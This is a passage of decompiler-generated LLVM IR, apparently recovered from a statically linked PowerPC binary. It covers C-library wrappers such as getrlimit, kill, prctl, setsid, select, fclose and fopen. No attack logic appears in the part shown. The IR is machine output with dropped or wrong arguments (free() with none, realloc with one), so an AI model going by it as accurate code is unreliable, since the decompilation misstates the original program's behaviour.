  br i1 %v3_10007a98, label %dec_label_pc_10007ab4, label %dec_label_pc_10007aa8

dec_label_pc_10007aa8:                            ; preds = %dec_label_pc_10007a84
  %v0_10007aa8 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10007ab0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ab0 = inttoptr i32 %v0_10007aa8 to i32*
  store i32 %v0_10007ab0, i32* %v2_10007ab0, align 4
  %v0_10007ab4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007ab4

dec_label_pc_10007ab4:                            ; preds = %dec_label_pc_10007a84, %dec_label_pc_10007aa8
  %v0_10007ab4 = phi i32 [ %v0_10007a94, %dec_label_pc_10007a84 ], [ %v0_10007ab4.pre, %dec_label_pc_10007aa8 ]
  %v1_10007ab4 = icmp slt i32 %v0_10007ab4, 0
  %v0_10007ab8 = load i32, i32* @r30, align 4
  %v3_10007ab8 = icmp eq i32 %v0_10007ab8, 0
  br i1 %v1_10007ab4, label %dec_label_pc_10007ae8, label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %dec_label_pc_10007ab4
  br i1 %v3_10007ab8, label %dec_label_pc_10007ac4, label %dec_label_pc_10007ad8.thread8

dec_label_pc_10007ad8.thread8:                    ; preds = %dec_label_pc_10007ac0
  br label %dec_label_pc_10007afc

dec_label_pc_10007ac4:                            ; preds = %dec_label_pc_10007ac0
  %v0_10007ac4 = load i32, i32* @r28, align 4
  %v3_10007ac4 = icmp eq i32 %v0_10007ac4, 0
  br i1 %v3_10007ac4, label %dec_label_pc_10007ad8, label %dec_label_pc_10007ad8.thread

dec_label_pc_10007ad8.thread:                     ; preds = %dec_label_pc_10007ac4
  br label %dec_label_pc_10007ae0

dec_label_pc_10007ad8:                            ; preds = %dec_label_pc_10007ac4
  %v0_10007acc = load i32, i32* @r29, align 4
  store i32 268466900, i32* @lr, align 4
  %v1_10007ad0 = call i32 @realloc(i32 %v0_10007acc)
  store i32 %v1_10007ad0, i32* @r30, align 4
  %v3_10007ad8 = icmp eq i32 %v1_10007ad0, 0
  br i1 %v3_10007ad8, label %dec_label_pc_10007ae0, label %dec_label_pc_10007afc

dec_label_pc_10007ae0:                            ; preds = %dec_label_pc_10007ad8.thread, %dec_label_pc_10007ad8
  %v0_10007ae0 = load i32, i32* @r29, align 4
  store i32 %v0_10007ae0, i32* @r30, align 4
  br label %dec_label_pc_10007afc

dec_label_pc_10007ae8:                            ; preds = %dec_label_pc_10007ab4
  br i1 %v3_10007ab8, label %dec_label_pc_10007aec, label %dec_label_pc_10007af8

dec_label_pc_10007aec:                            ; preds = %dec_label_pc_10007ae8
  %v0_10007aec = load i32, i32* @r29, align 4
  store i32 %v0_10007aec, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007af4.552 to i32), i32* @lr, align 4
  %v0_10007af0 = call i32 @free()
  br label %dec_label_pc_10007afc

dec_label_pc_10007af8:                            ; preds = %dec_label_pc_10007ae8, %dec_label_pc_10007a74
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10007afc

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007ad8.thread8, %dec_label_pc_10007ad8, %dec_label_pc_10007aec, %dec_label_pc_10007ae0, %dec_label_pc_10007a38, %dec_label_pc_10007af8
  %v0_10007b00 = load i32, i32* @r30, align 4
  ret i32 %v0_10007b00

; uselistorder directives
  uselistorder i32 %v0_10007a94, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007afc, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10007ae0, { 1, 0 }
  uselistorder label %dec_label_pc_10007ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10007a74, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007b20 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268466988, i32* @lr, align 4
  %v2_10007b28 = call i32 @getrlimit(i32 7, i32 %v2_10007b20)
  %v1_10007b2c = icmp slt i32 %v2_10007b28, 0
  br i1 %v1_10007b2c, label %dec_label_pc_10007b3c, label %dec_label_pc_10007b38

dec_label_pc_10007b38:                            ; preds = %entry
  %v3_10007b38 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007b3c

dec_label_pc_10007b3c:                            ; preds = %entry, %dec_label_pc_10007b38
  %v0_10007b48 = phi i32 [ 256, %entry ], [ %v3_10007b38, %dec_label_pc_10007b38 ]
  ret i32 %v0_10007b48

; uselistorder directives
  uselistorder label %dec_label_pc_10007b3c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10007b54 = load i32, i32* @global_var_10024a70.553, align 4
  %v3_10007b58 = icmp eq i32 %v3_10007b54, 0
  %v0_10007b5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007b58, i32 %v0_10007b5c)
  ret i32 %v3_10007b54
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007b80 = call i32 @__asm_mfcr()
  %v1_10007b84 = and i32 %v0_10007b80, 268435456
  %v3_10007b84 = icmp eq i32 %v1_10007b84, 0
  store i32 %v0_10007b80, i32* %r31.global-to-local, align 4
  br i1 %v3_10007b84, label %dec_label_pc_10007b9c, label %dec_label_pc_10007b90

dec_label_pc_10007b90:                            ; preds = %entry
  %v0_10007b90 = call i32 @__errno_location()
  %v0_10007b94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007b94 = inttoptr i32 %v0_10007b90 to i32*
  store i32 %v0_10007b94, i32* %v2_10007b94, align 4
  br label %dec_label_pc_10007b9c

dec_label_pc_10007b9c:                            ; preds = %entry, %dec_label_pc_10007b90
  %v0_10007bac = phi i32 [ %v0_10007b80, %entry ], [ -1, %dec_label_pc_10007b90 ]
  ret i32 %v0_10007bac

; uselistorder directives
  uselistorder label %dec_label_pc_10007b9c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007bc8 = call i32 @__asm_mfcr()
  %v1_10007bcc = and i32 %v0_10007bc8, 268435456
  %v3_10007bcc = icmp eq i32 %v1_10007bcc, 0
  store i32 %v0_10007bc8, i32* %r31.global-to-local, align 4
  br i1 %v3_10007bcc, label %dec_label_pc_10007be4, label %dec_label_pc_10007bd8

dec_label_pc_10007bd8:                            ; preds = %entry
  %v0_10007bd8 = call i32 @__errno_location()
  %v0_10007bdc = load i32, i32* %r31.global-to-local, align 4
  %v2_10007bdc = inttoptr i32 %v0_10007bd8 to i32*
  store i32 %v0_10007bdc, i32* %v2_10007bdc, align 4
  br label %dec_label_pc_10007be4

dec_label_pc_10007be4:                            ; preds = %entry, %dec_label_pc_10007bd8
  %v0_10007bf4 = phi i32 [ %v0_10007bc8, %entry ], [ -1, %dec_label_pc_10007bd8 ]
  ret i32 %v0_10007bf4

; uselistorder directives
  uselistorder label %dec_label_pc_10007be4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007c10 = call i32 @__asm_mfcr()
  %v1_10007c14 = and i32 %v0_10007c10, 268435456
  %v3_10007c14 = icmp eq i32 %v1_10007c14, 0
  store i32 %v0_10007c10, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c14, label %dec_label_pc_10007c2c, label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %entry
  %v0_10007c20 = call i32 @__errno_location()
  %v0_10007c24 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c24 = inttoptr i32 %v0_10007c20 to i32*
  store i32 %v0_10007c24, i32* %v2_10007c24, align 4
  br label %dec_label_pc_10007c2c

dec_label_pc_10007c2c:                            ; preds = %entry, %dec_label_pc_10007c20
  %v0_10007c3c = phi i32 [ %v0_10007c10, %entry ], [ -1, %dec_label_pc_10007c20 ]
  ret i32 %v0_10007c3c

; uselistorder directives
  uselistorder label %dec_label_pc_10007c2c, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10007c54 = and i32 %arg2, 64
  %v3_10007c54 = icmp eq i32 %v1_10007c54, 0
  br i1 %v3_10007c54, label %dec_label_pc_10007c80, label %dec_label_pc_10007c64

dec_label_pc_10007c64:                            ; preds = %entry
  %v2_10007c6c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007c6c, i32* %stack_var_-32, align 4
  %v0_10007c7c = load i32, i32* @r5, align 4
  br label %dec_label_pc_10007c80

dec_label_pc_10007c80:                            ; preds = %entry, %dec_label_pc_10007c64
  %v0_10007c80 = phi i32 [ 0, %entry ], [ %v0_10007c7c, %dec_label_pc_10007c64 ]
  store i32 %v0_10007c80, i32* @r5, align 4
  %v0_10007c88 = call i32 @__asm_mfcr()
  %v1_10007c8c = and i32 %v0_10007c88, 268435456
  %v3_10007c8c = icmp eq i32 %v1_10007c8c, 0
  store i32 %v0_10007c88, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c8c, label %dec_label_pc_10007ca4, label %dec_label_pc_10007c98

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007c80
  %v0_10007c98 = call i32 @__errno_location()
  %v0_10007c9c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c9c = inttoptr i32 %v0_10007c98 to i32*
  store i32 %v0_10007c9c, i32* %v2_10007c9c, align 4
  br label %dec_label_pc_10007ca4

dec_label_pc_10007ca4:                            ; preds = %dec_label_pc_10007c80, %dec_label_pc_10007c98
  %v0_10007cb4 = phi i32 [ %v0_10007c88, %dec_label_pc_10007c80 ], [ -1, %dec_label_pc_10007c98 ]
  ret i32 %v0_10007cb4

; uselistorder directives
  uselistorder label %dec_label_pc_10007ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10007c80, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_10007cc4 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_10007cc4
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007ce0 = call i32 @__asm_mfcr()
  %v1_10007ce4 = and i32 %v0_10007ce0, 268435456
  %v3_10007ce4 = icmp eq i32 %v1_10007ce4, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10007ce0, i32* %r31.global-to-local, align 4
  br i1 %v3_10007ce4, label %dec_label_pc_10007cfc, label %dec_label_pc_10007cf0

dec_label_pc_10007cf0:                            ; preds = %entry
  %v0_10007cf0 = call i32 @__errno_location()
  %v0_10007cf4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007cf4 = inttoptr i32 %v0_10007cf0 to i32*
  store i32 %v0_10007cf4, i32* %v2_10007cf4, align 4
  br label %dec_label_pc_10007cfc

dec_label_pc_10007cfc:                            ; preds = %entry, %dec_label_pc_10007cf0
  %v0_10007d0c = phi i32 [ %v0_10007ce0, %entry ], [ -1, %dec_label_pc_10007cf0 ]
  ret i32 %v0_10007d0c

; uselistorder directives
  uselistorder label %dec_label_pc_10007cfc, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d28 = call i32 @__asm_mfcr()
  %v1_10007d2c = and i32 %v0_10007d28, 268435456
  %v3_10007d2c = icmp eq i32 %v1_10007d2c, 0
  store i32 %v0_10007d28, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d2c, label %dec_label_pc_10007d44, label %dec_label_pc_10007d38

dec_label_pc_10007d38:                            ; preds = %entry
  %v0_10007d38 = call i32 @__errno_location()
  %v0_10007d3c = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d3c = inttoptr i32 %v0_10007d38 to i32*
  store i32 %v0_10007d3c, i32* %v2_10007d3c, align 4
  br label %dec_label_pc_10007d44

dec_label_pc_10007d44:                            ; preds = %entry, %dec_label_pc_10007d38
  %v0_10007d54 = phi i32 [ %v0_10007d28, %entry ], [ -1, %dec_label_pc_10007d38 ]
  ret i32 %v0_10007d54

; uselistorder directives
  uselistorder label %dec_label_pc_10007d44, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d70 = call i32 @__asm_mfcr()
  %v1_10007d74 = and i32 %v0_10007d70, 268435456
  %v3_10007d74 = icmp eq i32 %v1_10007d74, 0
  store i32 %v0_10007d70, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d74, label %dec_label_pc_10007d8c, label %dec_label_pc_10007d80

dec_label_pc_10007d80:                            ; preds = %entry
  %v0_10007d80 = call i32 @__errno_location()
  %v0_10007d84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d84 = inttoptr i32 %v0_10007d80 to i32*
  store i32 %v0_10007d84, i32* %v2_10007d84, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d8c:                            ; preds = %entry, %dec_label_pc_10007d80
  %v0_10007d9c = phi i32 [ %v0_10007d70, %entry ], [ -1, %dec_label_pc_10007d80 ]
  ret i32 %v0_10007d9c

; uselistorder directives
  uselistorder label %dec_label_pc_10007d8c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007db8 = call i32 @__asm_mfcr()
  %v1_10007dbc = and i32 %v0_10007db8, 268435456
  %v3_10007dbc = icmp eq i32 %v1_10007dbc, 0
  store i32 %v0_10007db8, i32* %r31.global-to-local, align 4
  br i1 %v3_10007dbc, label %dec_label_pc_10007dd4, label %dec_label_pc_10007dc8

dec_label_pc_10007dc8:                            ; preds = %entry
  %v0_10007dc8 = call i32 @__errno_location()
  %v0_10007dcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10007dcc = inttoptr i32 %v0_10007dc8 to i32*
  store i32 %v0_10007dcc, i32* %v2_10007dcc, align 4
  br label %dec_label_pc_10007dd4

dec_label_pc_10007dd4:                            ; preds = %entry, %dec_label_pc_10007dc8
  %v0_10007de4 = phi i32 [ %v0_10007db8, %entry ], [ -1, %dec_label_pc_10007dc8 ]
  ret i32 %v0_10007de4

; uselistorder directives
  uselistorder label %dec_label_pc_10007dd4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007e00 = call i32 @__asm_mfcr()
  %v1_10007e04 = and i32 %v0_10007e00, 268435456
  %v3_10007e04 = icmp eq i32 %v1_10007e04, 0
  store i32 %v0_10007e00, i32* %r31.global-to-local, align 4
  br i1 %v3_10007e04, label %dec_label_pc_10007e1c, label %dec_label_pc_10007e10

dec_label_pc_10007e10:                            ; preds = %entry
  %v0_10007e10 = call i32 @__errno_location()
  %v0_10007e14 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e14 = inttoptr i32 %v0_10007e10 to i32*
  store i32 %v0_10007e14, i32* %v2_10007e14, align 4
  br label %dec_label_pc_10007e1c

dec_label_pc_10007e1c:                            ; preds = %entry, %dec_label_pc_10007e10
  %v0_10007e2c = phi i32 [ %v0_10007e00, %entry ], [ -1, %dec_label_pc_10007e10 ]
  ret i32 %v0_10007e2c

; uselistorder directives
  uselistorder label %dec_label_pc_10007e1c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_10007e30 = icmp eq i32 %arg2, 0
  br i1 %v3_10007e30, label %dec_label_pc_10007e70, label %dec_label_pc_10007e58

dec_label_pc_10007e58:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10007e70, label %dec_label_pc_10007e60

dec_label_pc_10007e60:                            ; preds = %dec_label_pc_10007e58
  %v0_10007e60 = call i32 @__errno_location()
  %v2_10007e68 = inttoptr i32 %v0_10007e60 to i32*
  store i32 22, i32* %v2_10007e68, align 4
  %v0_10007e94.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007e90

dec_label_pc_10007e70:                            ; preds = %dec_label_pc_10007e58, %entry
  %v0_10007e74 = call i32 @__asm_mfcr()
  %v1_10007e78 = and i32 %v0_10007e74, 268435456
  %v3_10007e78 = icmp eq i32 %v1_10007e78, 0
  store i32 %v0_10007e74, i32* %r31.global-to-local, align 4
  br i1 %v3_10007e78, label %dec_label_pc_10007e90, label %dec_label_pc_10007e84

dec_label_pc_10007e84:                            ; preds = %dec_label_pc_10007e70
  %v0_10007e84 = call i32 @__errno_location()
  %v0_10007e88 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e88 = inttoptr i32 %v0_10007e84 to i32*
  store i32 %v0_10007e88, i32* %v2_10007e88, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007e90

dec_label_pc_10007e90:                            ; preds = %dec_label_pc_10007e70, %dec_label_pc_10007e60, %dec_label_pc_10007e84
  %v0_10007e94 = phi i32 [ %v0_10007e74, %dec_label_pc_10007e70 ], [ %v0_10007e94.pre, %dec_label_pc_10007e60 ], [ -1, %dec_label_pc_10007e84 ]
  ret i32 %v0_10007e94

; uselistorder directives
  uselistorder label %dec_label_pc_10007e90, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007ec0 = call i32 @__asm_mfcr()
  %v1_10007ec4 = and i32 %v0_10007ec0, 268435456
  %v3_10007ec4 = icmp eq i32 %v1_10007ec4, 0
  store i32 %v0_10007ec0, i32* %r31.global-to-local, align 4
  br i1 %v3_10007ec4, label %dec_label_pc_10007edc, label %dec_label_pc_10007ed0

dec_label_pc_10007ed0:                            ; preds = %entry
  %v0_10007ed0 = call i32 @__errno_location()
  %v0_10007ed4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ed4 = inttoptr i32 %v0_10007ed0 to i32*
  store i32 %v0_10007ed4, i32* %v2_10007ed4, align 4
  br label %dec_label_pc_10007edc

dec_label_pc_10007edc:                            ; preds = %entry, %dec_label_pc_10007ed0
  %v0_10007eec = phi i32 [ %v0_10007ec0, %entry ], [ -1, %dec_label_pc_10007ed0 ]
  ret i32 %v0_10007eec

; uselistorder directives
  uselistorder label %dec_label_pc_10007edc, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10007ef4 = call i32 @wait4(i32 0)
  ret i32 %v1_10007ef4
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007f10 = call i32 @__asm_mfcr()
  %v1_10007f14 = and i32 %v0_10007f10, 268435456
  %v3_10007f14 = icmp eq i32 %v1_10007f14, 0
  store i32 %v0_10007f10, i32* %r31.global-to-local, align 4
  br i1 %v3_10007f14, label %dec_label_pc_10007f2c, label %dec_label_pc_10007f20

dec_label_pc_10007f20:                            ; preds = %entry
  %v0_10007f20 = call i32 @__errno_location()
  %v0_10007f24 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007f24 = inttoptr i32 %v0_10007f20 to i32*
  store i32 %v0_10007f24, i32* %v2_10007f24, align 4
  br label %dec_label_pc_10007f2c

dec_label_pc_10007f2c:                            ; preds = %entry, %dec_label_pc_10007f20
  %v0_10007f3c = phi i32 [ %v0_10007f10, %entry ], [ -1, %dec_label_pc_10007f20 ]
  ret i32 %v0_10007f3c

; uselistorder directives
  uselistorder label %dec_label_pc_10007f2c, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007f44 = mul i32 %arg1, 2
  %v3_10007f48 = load i32, i32* inttoptr (i32 268585448 to i32*), align 8
  %v2_10007f4c = add i32 %v3_10007f48, %v1_10007f44
  %v3_10007f4c = inttoptr i32 %v2_10007f4c to i16*
  %v4_10007f4c = load i16, i16* %v3_10007f4c, align 2
  %v5_10007f4c = zext i16 %v4_10007f4c to i32
  %v1_10007f50 = call i32 @__asm_rlwinm(i32 %v5_10007f4c, i32 0, i32 26, i32 26)
  ret i32 %v1_10007f50
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007f58 = add i32 %arg1, 128
  %v1_10007f5c = mul i32 %arg1, 2
  %v2_10007f60 = icmp ugt i32 %v1_10007f58, 383
  %v0_10007f64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10007f60, i32 %v0_10007f64)
  %v3_10007f6c = load i32, i32* inttoptr (i32 268585456 to i32*), align 16
  %v2_10007f70 = add i32 %v1_10007f5c, %v3_10007f6c
  %v3_10007f70 = inttoptr i32 %v2_10007f70 to i16*
  %v4_10007f70 = load i16, i16* %v3_10007f70, align 2
  %v5_10007f70 = sext i16 %v4_10007f70 to i32
  ret i32 %v5_10007f70
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10024a80.560 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10007f98 = add i32 %tmp, 52
  %v3_10007f98 = inttoptr i32 %v2_10007f98 to i32*
  %v4_10007f98 = load i32, i32* %v3_10007f98, align 4
  store i32 %v4_10007f98, i32* @r28, align 4
  %v3_10007f9c = icmp eq i32 %v4_10007f98, 0
  store i1 %v3_10007f9c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007f9c, label %dec_label_pc_10007fa4, label %dec_label_pc_10007fc4

dec_label_pc_10007fa4:                            ; preds = %entry
  %v2_10007fac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007fac, i32* @r3, align 4
  %v0_10007fb8 = call i32 @__pthread_return_void()
  %v0_10007fc0 = call i32 @__pthread_return_0()
  %v0_10007fc4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007fc4

dec_label_pc_10007fc4:                            ; preds = %entry, %dec_label_pc_10007fa4
  %v0_10007fd4 = phi i32 [ %tmp, %entry ], [ %v0_10007fc4.pre, %dec_label_pc_10007fa4 ]
  %v1_10007fc4 = inttoptr i32 %v0_10007fd4 to i16*
  %v2_10007fc4 = load i16, i16* %v1_10007fc4, align 2
  %v3_10007fc4 = zext i16 %v2_10007fc4 to i32
  store i32 0, i32* @r27, align 4
  %v1_10007fcc = and i32 %v3_10007fc4, 64
  %v3_10007fcc = icmp eq i32 %v1_10007fcc, 0
  br i1 %v3_10007fcc, label %dec_label_pc_10007fe0, label %dec_label_pc_10007fd4

dec_label_pc_10007fd4:                            ; preds = %dec_label_pc_10007fc4
  store i32 268468188, i32* @lr, align 4
  %v4_10007fd8 = call i32 @fflush_unlocked(i16* %v1_10007fc4, i32 %v1_10007fcc)
  store i32 %v4_10007fd8, i32* @r27, align 4
  %v0_10007fe0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007fe0

dec_label_pc_10007fe0:                            ; preds = %dec_label_pc_10007fc4, %dec_label_pc_10007fd4
  %v0_10007fe0 = phi i32 [ %v0_10007fd4, %dec_label_pc_10007fc4 ], [ %v0_10007fe0.pre, %dec_label_pc_10007fd4 ]
  %v1_10007fe0 = add i32 %v0_10007fe0, 4
  %v2_10007fe0 = inttoptr i32 %v1_10007fe0 to i32*
  %v3_10007fe0 = load i32, i32* %v2_10007fe0, align 4
  store i32 268468200, i32* @lr, align 4
  %v1_10007fe4 = call i32 @__libc_close(i32 %v3_10007fe0)
  %v3_10007fe8 = icmp eq i32 %v1_10007fe4, 0
  store i1 %v3_10007fe8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10007fe4, -1
  br i1 %tmp8, label %dec_label_pc_10007ff4, label %dec_label_pc_10007ff0

dec_label_pc_10007ff0:                            ; preds = %dec_label_pc_10007fe0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10007ff4

dec_label_pc_10007ff4:                            ; preds = %dec_label_pc_10007fe0, %dec_label_pc_10007ff0
  store i32 ptrtoint ([3 x i8]* @global_var_1000c0d8.561 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100246c4.562 to i32), i32* @r29, align 4
  %v1_10008008 = load i32, i32* @r31, align 4
  %v2_10008008 = add i32 %v1_10008008, 4
  %v3_10008008 = inttoptr i32 %v2_10008008 to i32*
  store i32 -1, i32* %v3_10008008, align 4
  %v2_1000800c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000800c, i32* @r30, align 4
  store i32 %v2_1000800c, i32* @r3, align 4
  %v0_1000801c = call i32 @__pthread_return_void()
  %v0_10008024 = call i32 @__pthread_return_0()
  %v3_1000802c = load i32, i32* @global_var_10024a58.563, align 4
  store i32 %v2_1000800c, i32* @r3, align 4
  %v1_10008038 = add i32 %v3_1000802c, 1
  store i32 %v1_10008038, i32* @global_var_10024a58.563, align 4
  %v0_10008040 = call i32 @__pthread_return_void()
  %v0_10008044 = load i32, i32* @r31, align 4
  %v1_10008044 = inttoptr i32 %v0_10008044 to i16*
  %v2_10008044 = load i16, i16* %v1_10008044, align 2
  %v3_10008044 = zext i16 %v2_10008044 to i32
  %v0_10008048 = load i32, i32* @r28, align 4
  %v3_10008048 = icmp eq i32 %v0_10008048, 0
  store i1 %v3_10008048, i1* %cr7_eq.global-to-local, align 1
  %v1_1000804c = call i32 @__asm_rlwinm(i32 %v3_10008044, i32 0, i32 17, i32 18)
  %v1_10008054 = or i32 %v1_1000804c, 48
  %v1_10008058 = trunc i32 %v1_10008054 to i16
  %v2_10008058 = load i32, i32* @r31, align 4
  %v3_10008058 = inttoptr i32 %v2_10008058 to i16*
  store i16 %v1_10008058, i16* %v3_10008058, align 2
  %v0_1000805c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000805c, label %dec_label_pc_10008060, label %dec_label_pc_1000806c

dec_label_pc_10008060:                            ; preds = %dec_label_pc_10007ff4
  %v2_10008060 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10008060, i32* @r3, align 4
  %v0_10008068 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000806c

dec_label_pc_1000806c:                            ; preds = %dec_label_pc_10007ff4, %dec_label_pc_10008060
  %v0_1000806c = load i32, i32* @r31, align 4
  %v1_1000806c = inttoptr i32 %v0_1000806c to i16*
  %v2_1000806c = load i16, i16* %v1_1000806c, align 2
  %v1_10008070 = and i16 %v2_1000806c, 16384
  %v3_10008070 = icmp eq i16 %v1_10008070, 0
  br i1 %v3_10008070, label %dec_label_pc_10008080, label %dec_label_pc_10008078

dec_label_pc_10008078:                            ; preds = %dec_label_pc_1000806c
  %v1_10008078 = add i32 %v0_1000806c, 8
  %v2_10008078 = inttoptr i32 %v1_10008078 to i32*
  %v3_10008078 = load i32, i32* %v2_10008078, align 4
  store i32 %v3_10008078, i32* @r3, align 4
  store i32 268468352, i32* @lr, align 4
  %v0_1000807c = call i32 @free()
  br label %dec_label_pc_10008080

dec_label_pc_10008080:                            ; preds = %dec_label_pc_1000806c, %dec_label_pc_10008078
  store i32 %v2_1000800c, i32* @r3, align 4
  %v0_1000808c = call i32 @__pthread_return_void()
  %v0_10008094 = call i32 @__pthread_return_0()
  %v3_1000809c = load i32, i32* @global_var_10024a5c.564, align 4
  store i32 %v2_1000800c, i32* @r3, align 4
  %v1_100080a8 = add i32 %v3_1000809c, 1
  store i32 %v1_100080a8, i32* @global_var_10024a5c.564, align 4
  %v0_100080b0 = call i32 @__pthread_return_void()
  store i32 268468408, i32* @lr, align 4
  %v0_100080b4 = call i32 @_stdio_openlist_dec_use()
  %v0_100080bc = load i32, i32* @r27, align 4
  ret i32 %v0_100080bc

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008080, { 1, 0 }
  uselistorder label %dec_label_pc_1000806c, { 1, 0 }
  uselistorder label %dec_label_pc_10007ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10007fe0, { 1, 0 }
  uselistorder label %dec_label_pc_10007fc4, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_100080d8 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_100080d8
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_100080fc = ptrtoint i32* %stack_var_-104 to i32
